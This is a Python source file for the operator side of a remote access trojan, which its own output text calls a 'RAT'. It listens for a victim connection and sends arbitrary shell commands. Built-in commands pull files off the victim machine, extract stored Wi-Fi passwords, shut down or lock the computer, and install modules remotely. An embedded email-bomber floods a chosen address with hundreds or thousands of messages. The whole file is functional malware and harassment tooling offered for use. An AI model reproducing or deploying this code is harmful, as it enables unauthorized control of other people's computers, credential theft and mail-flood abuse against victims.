import socket
import subprocess
import sys
import re
import colorama


def imports():
    try:
        import pynput
    except ModuleNotFoundError:
        alr = subprocess.check_output("pip install pynput", shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        import pynput

    try:
        import keyboard
    except ModuleNotFoundError:
        alr = subprocess.check_output("pip install keyboard", shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        import keyboard

    try:
        import pyttsx3
    except ModuleNotFoundError:
        alr = subprocess.check_output("pip install pyttsx3", shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        import pyttsx3

imports()

import pynput
import keyboard


class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'

logsuc = "[+] Login Successful"
logfail = "Incorrect"
read = 0
wallow = 0
readallow = 0

privateIP = socket.gethostbyname(socket.gethostname())
host = str(privateIP)
p = input("Enter Port: ")

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listener.bind((host, int(p)))
print(bcolors.GREEN + ' #### Listening on port ' + p + '... ' + '####')
listener.listen(0)
conn, addr = listener.accept()
print("[+] Connection established")

def login():
    while True:
        passwd = input("Login: ")
        conn.send(str.encode(passwd))
        lr = str(conn.recv(1024), "utf-8")
        if lr == logsuc:
            print(bcolors.GREEN +
                  '\n\n\n\t\t\t|#############################################|\n'
                  '\t\t\t|        ______________________________       |\n'                                              
                  '\t\t\t|        \______   \  /  _  \__    ___/       |\n'
                  '\t\t\t|          |       _/ /  /_\  \|    |         |\n'                
                  '\t\t\t|          |    |   \/    |    \    |         |\n'                                
                  '\t\t\t|          |____|_  /\____|__  /____|         |\n'  
                  '\t\t\t|                 \/         \/               |\n'                                          
                  '\t\t\t|#############################################|\n\n')




            print(bcolors.GREEN + logsuc)
            print(bcolors.YELLOW + 'Please Type HELP to know all custom commands')
            os = str(conn.recv(1024), "utf-8")
            if "win" in os:
                os = "WINDOWS MACHINE"
            elif "mac" in os:
                os = "MAC MACHINE"
            elif "lin" in os:
                os = "LINUX MACHINE"
            elif "ub" in os:
                os = "UBUNTU MACHINE"
            print(bcolors.RED + "########## WARNING!!!! THIS RAT IS MADE FOR WINDOWS SO SOME OF THE CUSTOM COMMANDS MAY NOT WORK ON OTHER OS ##########")
            print(bcolors.YELLOW + "----------------------------------------------------------------------------------------------------------------------")
            print(bcolors.RED + "########## YOUR CLIENT IS USING A " + os + " SO MAKE SURE TO USE COMMANDS THAT WORK ON " + os + " ##########")
            break
        elif lr != logsuc:
            print(bcolors.RED + logfail)

def help():
    print(bcolors.YELLOW + '[+] Type pipins to install a python module\n[+] Type quit to end the session\n[+] Type pubip'
                           ' to see the clients public IP address\n[+] Type shutdown to shutdown client and type cshutdo'
                           'wn to cancel\n[+] Type email to activate email bomb\n[+] Type wifi pass to get the wifi '
                           'password of the client machine\n[+] Type download\n[+] Type speak "any text that you want the client computer to speak"')



def send_commands():
    global bcolors, wallow
    while True:
        while True:
            cmd = input(">> ")
            lcmd = cmd.lower()
            if cmd != "":
                break

        def download_files():
            conn.send(str.encode(lcmd))
            path = input("Please enter the EXACT file path of the file you would like to download from the client: ")
            conn.send(str.encode(path))
            file_content = str(conn.recv(99999), "utf-8")
            file_content = bytes(file_content, encoding='utf8')
            #############################################
            received_path = input(
                bcolors.GREEN + "File Received! " + "What would you like to name this file: ")
            with open(received_path, "wb") as file:
                file.write(file_content)

        if lcmd == "quit":
            quit()
        if lcmd == "shutdown":
            cmd = "shutdown /s"
        if lcmd == "cshutdown" or lcmd == "c shutdown":
            cmd = "shutdown /a"
        if lcmd == 'email':
            import smtplib
            import sys

            class bcolors:
                GREEN = '\033[92m'
                YELLOW = '\033[93m'
                RED = '\033[91m'
                BLUE = '\033[94m'

            def banner():
                print(bcolors.GREEN + '+[+[+[ Email-Bomber v1.0 ]+]+]+')
                print(bcolors.GREEN + '+[+[+[ made with codes ]+]+]+')
                print(bcolors.RED + '''
                                         \|/
                                       `--+--'
                                          |
                                      ,--'#`--.
                                      |#######|
                                   _.-'#######`-._
                                ,-'###############`-.
                              ,'#####################`,         .___     .__         .
                             |#########################|        [__ ._ _ [__) _ ._ _ |_  _ ._.
                            |###########################|       [___[ | )[__)(_)[ | )[_)(/,[
                           |#############################|
                           |#############################|              
                           |#############################|
                            |###########################|
                             \#########################/
                              `.#####################,'
                                `._###############_,'
                                   `--..#####..--'       




                ###############################################################
                #  Make sure you allow less secure apps for the from address  #    
                #                      IMPORTANT                              #
                #                      IMPORTANT                              #
                #                      IMPORTANT                              #
                #  Make sure you allow less secure apps for the from address  #  
                ###############################################################
            *.______________________________________________________________,' (Bomb)
                                                                                `--' ''')

            class Email_Bomber:
                count = 0

                def __init__(self):
                    try:
                        print(bcolors.RED + '\n+[+[+[ Initializing program ]+]+]+')
                        self.target = str(input(bcolors.GREEN + 'Enter target email <: '))
                        self.mode = int(input(
                            bcolors.GREEN + 'Enter BOMB mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) <: '))
                        if int(self.mode) > int(4) or int(self.mode) < int(1):
                            print('ERROR: Invalid Option. GoodBye.')
                            sys.exit(1)
                    except Exception as e:
                        print(f'ERROR: {e}')

                def bomb(self):
                    try:
                        print(bcolors.RED + '\n+[+[+[ Setting up bomb ]+]+]+')
                        self.amount = None
                        if self.mode == int(1):
                            self.amount = int(1000)
                        elif self.mode == int(2):
                            self.amount = int(500)
                        elif self.mode == int(3):
                            self.amount = int(250)
                        else:
                            self.amount = int(input(bcolors.GREEN + 'Choose a CUSTOM amount <: '))
                        print(
                            bcolors.RED + f'\n+[+[+[ You have selected BOMB mode: {self.mode} and {self.amount} emails ]+]+]+')
                    except Exception as e:
                        print(f'ERROR: {e}')

                def email(self):
                    try:
                        print(bcolors.RED + '\n+[+[+[ Setting up email ]+]+]+')
                        self.server = str(input(
                            bcolors.GREEN + 'Enter email server | or select premade options - 1:Gmail 2:Yahoo 3:Outlook <: '))
                        premade = ['1', '2', '3']
                        default_port = True
                        if self.server not in premade:
                            default_port = False
                            self.port = int(input(bcolors.GREEN + 'Enter port number <: '))

                        if default_port == True:
                            self.port = int(587)

                        if self.server == '1':
                            self.server = 'smtp.gmail.com'
                        elif self.server == '2':
                            self.server = 'smtp.mail.yahoo.com'
                        elif self.server == '3':
                            self.server = 'smtp-mail.outlook.com'

                        self.fromAddr = str(input(bcolors.GREEN + 'Enter from address <: '))
                        self.fromPwd = str(input(bcolors.GREEN + 'Enter from password <: '))
                        self.subject = str(input(bcolors.GREEN + 'Enter subject <: '))
                        self.message = str(input(bcolors.GREEN + 'Enter message <: '))

                        self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
                        ''' % (self.fromAddr, self.target, self.subject, self.message)

                        self.s = smtplib.SMTP(self.server, self.port)
                        self.s.ehlo()
                        self.s.starttls()
                        self.s.ehlo()
                        self.s.login(self.fromAddr, self.fromPwd)
                    except Exception as e:
                        print(f'ERROR: {e}')

                def send(self):
                    try:
                        self.s.sendmail(self.fromAddr, self.target, self.msg)
                        self.count += 1
                        print(bcolors.YELLOW + f'BOMB: {self.count}')
                    except Exception as e:
                        print(f'ERROR: {e}')

                def attack(self):
                    print(bcolors.RED + '\n+[+[+[ Attacking... ]+]+]+')
                    for email in range(self.amount + 1):
                        self.send()
                    self.s.close()
                    print(bcolors.RED + '\n+[+[+[ Attack finished ]+]+]+')
                    sys.exit(0)

            if __name__ == '__main__':
                banner()
                bomb = Email_Bomber()
                bomb.bomb()
                bomb.email()
                bomb.attack()
        if lcmd == "help":
            help()
        if lcmd == "pipins":
            x=4
            while x==4:
                module = input("What module would you like to install on the client machine? ")
                module = module.lower()
                if module == "quit":
                    quit()
                cmd = "pip install " + module
                x=5
        if "speak " in lcmd:
            conn.send(str.encode(lcmd))
        if lcmd == "wifipass" or lcmd == "wifi pass":
            ex = 0
            while True:
                conn.send(str.encode(lcmd))
                wpass = str(conn.recv(99999), "utf-8")
                if wpass == "something":
                    send_commands()
                if wpass != "None":
                    wpass_r = re.search("(?:='Key\sContent\s*:\s)(.*)", wpass)
                    new_wpass = wpass_r.group(1)
                    final_wpass = new_wpass.replace(r"\r'>", " ")
                    if ex == 0:
                        print(bcolors.GREEN + final_wpass + "Is most likely the password")
                        print(bcolors.YELLOW + "These are some other passwords that were found: ")
                        ex = 1
                    elif ex == 1:
                        print(bcolors.RED + final_wpass)
                        if wpass == "something":
                            wallow = 1
        if lcmd == "lock" or lcmd == "lock ":
            cmd = 'Rundll32.exe user32.dll,LockWorkStation'

        if lcmd != "email" and lcmd != "help" and "speak " not in lcmd and read == 0 and wallow == 0:
            if lcmd == "download":
                download_files()

            conn.send(str.encode(cmd))
            cmd_response = str(conn.recv(99999), "utf-8")
            print(bcolors.BLUE + cmd_response)
login()
send_commands()